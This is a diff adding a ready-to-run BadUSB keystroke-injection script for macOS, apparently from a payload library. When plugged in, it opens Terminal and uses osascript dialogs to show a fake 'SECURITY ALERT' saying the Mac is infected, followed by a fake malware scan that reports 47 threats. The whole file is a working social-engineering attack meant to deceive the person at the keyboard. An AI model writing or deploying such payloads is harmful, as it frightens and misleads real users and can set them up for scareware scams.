@@ -1,0 +1,33 @@
+REM Title: macOS Fake Security Alert
+REM Author: BadUSB Library
+REM Description: Shows fake security alert to trick user
+REM Target: macOS 10.15+
+REM Category: Social Engineering
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Show fake security alert
+STRING osascript -e 'display dialog "SECURITY ALERT
+
+Your Mac has been compromised by malware.
+Click OK to run security scan and remove threats.
+
+This may take several minutes." buttons {"OK", "Cancel"} default button "OK" with title "Security Alert" with icon stop'
+ENTER
+DELAY 3000
+
+REM Show fake scan progress
+STRING osascript -e 'display dialog "Scanning system files...
+
+Found 47 threats
+Removing malware...
+Please wait..." buttons {"OK"} default button "OK" with title "Security Scan" with icon caution'
+ENTER
+DELAY 3000
